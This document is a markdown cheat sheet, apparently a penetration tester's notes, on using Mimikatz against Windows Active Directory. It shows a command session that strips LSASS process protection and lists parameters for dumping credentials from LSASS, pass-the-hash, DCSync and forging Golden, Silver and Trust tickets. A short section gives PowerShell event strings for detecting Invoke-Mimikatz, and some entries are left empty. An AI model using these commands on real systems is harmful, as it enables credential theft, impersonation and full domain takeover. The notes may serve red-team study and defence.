## Mimikatz Tool


### PowerShell & Mimikatz:
---
`Invoke-Mimikatz` loads Mimikatz DLL directly into memory (DLL is embeded in the script), and executed from memory without touching disk.

### LSA Protection
---
A Windows feature that enables protecting LSASS process. Mimikatz can still bypass this with a driver (“!+”).
```powershell
mimikatz# privilege::debug
Privilege '20' OK

mimikatz# !+
[*]mimikatz driver not present
[*]mimikatz driver succesfully loaded
[*]mimikatz driver ACL to everyone
[*]mimikatz driver started

mimikatz# !processprotect /process:lsass.exe /remove
Process: lsass.exe
PID 492 -> 00/00 [0-0-0]
```

### Detecting Invoke-Mimikats
---
Parse PowerShell Events for
- `System.Reflection.AssemblyName`
- `System.Reflection.Emit.AssemblyBuilderAccess`
- `System.Runtime.InteropServices.MarshalAsAttribute`
- `TOKEN_PRIVILEGES`
- `SE_PRIVILEGE_ENABLED`

### Golden Ticket
---
A Golden Ticket is a TGT using the KRBTGT NTLM password hash to encrypt and sign.

A Golden Ticket (GT) can be created to impersonate any user in the domain. Since the Golden Ticket is an authentication ticket (TGT described below), its scope is the entire domain (and the AD forest by leveraging SID History) since the TGT is used to get service tickets (TGS) used to access resources. The Golden Ticket (TGT) contains user group membership information (PAC) and is signed and encrypted using the domain’s Kerberos service account (KRBTGT) which can only be opened and read by the KRBTGT account.

Once an attacker gets access to the KRBTGT password hash, they can create Golden Tickets (TGT) that provide access to anything in AD at any time.


### Silver Ticket
--- 
A Silver Ticket is a TGS (similar to TGT in format) using the target service account’s (identified by SPN mapping) NTLM password hash to encrypt and sign.

### Trust Ticket
--- 
Once the Active Directory Trust password hash is determined (Mimikatz “privilege::debug” “lsadump::trust /patch” exit), a trust ticket can be generated.
### Command Guide
---

#### SEKURLSA Module
---
Extracts passwords, keys, pin codes, tickets from memory of LSASS. 

- **SEKURLSA::LogonPasswords** : Dumps password data in LSASS for currently logged on (or recently logged on) accounts as well as services running under the context of user credentials.
- **SEKURLSA::Pth** : Pass-the-Hash and Over-Pass-the-Hash to run a process under another credentials. Requires NTLM Hash of the user
  - `/user` : Username to impersonate
  - `/domain` : FQDN od the user domain
  - `/rc4` or `/ntlm` : User password key
  - `/run` : Command to run

- **SEKURLSA::ekeys** : List Kerberos encryption keys

- **SEKURLSA::krbtgt** : Get domain Kerberos service account (KRBTGT) password data

- **SEKURLSA::tickets /export** : 

#### LSADUMP Module
--- 
Interacts with the Windows Local Security Authority (LSA) to extract credentials. Most of these commands require either debug rights (`privilege::debug`) or local System.
- **LSADUMP::DCSync** : Ask a DC to synchronize an object (get password data for account). Requires membership in Domain Administrator, domain Administrators, or custom delegation.
  - `/all` : DCSync pull data for the entire domain.
  - `/user` : user id or SID of the user you want to pull the data for.
  - `/domain` : FQDN of the Active Directory domain. Mimikatz will discover a DC in the domain to connect to. If this parameter is not provided, Mimikatz defaults to the current domain.
  - `/dc` : Specify the Domain Controller you want DCSync to connect to and gather data.
- **LSADUMP::lsa** : Dumps credential data in an Active Directory domain when run on a Domain Controller.
  - `/inject` : Inject LSASS to extract credentials
  - `/name` : account name for target user account
  - `/id` : RID for target user account
  - `/patch` : patch LSASS.

### KERBEROS Module
---
The KERBEROS Mimikatz module is used to interface with the official Microsoft Kerberos API. No special rights are required for the commands in this module.

- **KERBEROS::golden** : To create a TGT (Golden Ticket).
  - `/domain` : the fully qualified domain name. In this example: “lab.adsecurity.org”.
  - `/sid` : the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.
  - `/user` : username to impersonate
  - `/groups` (optional) : group RIDs the user is a member of (the first is the primary group).
    - Add user or computer account RIDs to receive the same access.
    - Default Groups: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
  - `/krbtgt` : NTLM password hash for the domain KDC service account (KRBTGT). Used to encrypt and sign the TGT.
  - `/ticket` (optional) : provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
  - `/ptt` : as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
  - `/id` (optional) : user RID. Mimikatz default is 500 (the default Administrator account RID).
  - `/startoffset` (optional) : the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
  - `/endin` (optional) : ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
  - `/renewmax` (optional) : maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).
  - `/sids` (optional) : set to be the SID of the Enterprise Admins group in the AD forest ([ADRootDomainSID]-519) to spoof Enterprise Admin rights throughout the AD forest (AD admin in every domain in the AD Forest).
  - `/aes256` : the AES256 key

- **KERBEROS::golden** : To create Silver Ticket (uses same module). Uses same parameters as before, adding the mandatory ones:
  - `/target` : Target server FQDN
  - `/service` : Kerberos Service running in the server: host, cifs, http...
  -  `rc4` : NTLM hash for the service

- **KERBEROS::ptt** : 

